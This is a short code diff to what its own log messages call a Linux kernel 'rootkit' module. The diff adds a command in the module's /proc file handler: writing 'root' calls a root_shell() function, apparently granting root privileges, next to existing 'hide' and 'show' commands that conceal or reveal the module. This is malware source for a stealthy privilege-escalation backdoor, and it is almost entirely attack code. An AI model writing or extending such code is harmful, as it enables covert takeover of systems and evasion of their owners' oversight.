@@ -12,6 +12,7 @@
 #include "header/proc.h"
 #include "header/hide.h"
 #include "header/config.h"
+#include "header/shell.h"
 
 
 
@@ -22,16 +23,20 @@
 ssize_t handler_write_proc_file(
         struct file *file, const char __user *buffer, 
         size_t length, loff_t *data) {
-    printk("rootkit: write in \"/proc/%s\" file: %ld\n", 
+        printk("rootkit: write in \"/proc/%s\" file: %ld\n", 
         PROC_FILE_NAME, length);
 
     if (strncmp(buffer, "hide", 4) == 0) {
         module_hide();
         printk("rootkit: WRITE HIDE\n");
     }
-    else {
+    else if (strncmp(buffer, "show", 4) == 0) {
         module_show();
         printk("rootkit: WRITE SHOW\n");
+    }
+    else if (strncmp(buffer, "root", 4) == 0) {
+        root_shell();
+        printk("rootkit: GET ROOT SHELL\n");
     }
 
     return length;
